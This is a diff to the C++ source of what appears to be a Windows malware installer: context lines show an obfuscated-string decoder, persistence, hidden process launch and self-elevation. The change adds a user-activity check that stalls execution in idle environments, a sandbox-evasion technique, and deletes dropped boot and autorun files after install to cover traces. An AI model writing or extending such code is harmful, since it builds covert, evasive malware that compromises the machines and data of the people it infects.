@@ -22,6 +22,7 @@ namespace fs = std::filesystem;
 #pragma comment(lib, "winhttp.lib")
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "shell32.lib")
+#pragma comment(lib, "user32.lib")
 
 
 static std::string XD(const unsigned char* p, size_t n) {
@@ -622,6 +623,18 @@ static void Persist() {
 }
 
 
+static void ActivityGate() {
+    LASTINPUTINFO li{};
+    li.cbSize = sizeof li;
+    for (int i = 0; i < 60; ++i) {
+        if (!GetLastInputInfo(&li)) return;
+        DWORD idle = GetTickCount() - li.dwTime;
+        if (idle < 120000) return;
+        Sleep(5000);
+    }
+}
+
+
 static void Install() {
     wchar_t buf[MAX_PATH]{};
     GetModuleFileNameW(nullptr, buf, MAX_PATH);
@@ -648,6 +661,10 @@ static void Install() {
 
     if (fs::exists(StageExe()))
         RunHidden(StageExe().wstring(), L"--watch");
+
+    std::error_code ec2;
+    fs::remove(fs::path(origin) / Widen(XDS(ENC_BOOT)), ec2);
+    fs::remove(fs::path(origin) / Widen(XDS(ENC_AUTO)), ec2);
 }
 
 
@@ -692,6 +709,7 @@ int WINAPI wWinMain(HINSTANCE, HINSTANCE, LPWSTR, int) {
     if (argc <= 1) install = fs::exists(StageExe());
 
     if (install) {
+        ActivityGate();
         if (!IsAdmin() && ElevateSelf()) return 0;
         Install();
     } else if (watch) {
